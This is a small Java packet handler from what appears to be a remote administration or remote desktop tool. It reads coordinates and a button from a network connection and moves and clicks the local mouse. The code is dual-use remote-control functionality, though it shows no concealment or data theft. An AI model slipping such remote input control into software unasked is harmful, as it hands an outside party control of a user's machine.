package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketP extends Packet {

	@Override
	public void read(String line) throws Exception {
		int x = Integer.parseInt(Connection.readLine());
		int y = Integer.parseInt(Connection.readLine());
		int btn = Integer.parseInt(Connection.readLine());
		int i = Integer.parseInt(Connection.readLine());
		if (i == -1) {
			Main.robot.mouseMove(x, y);
			Main.robot.mousePress(btn);
		} else {
			Main.robots[i].mouseMove(x, y);
			Main.robots[i].mousePress(btn);
		}
	}

}
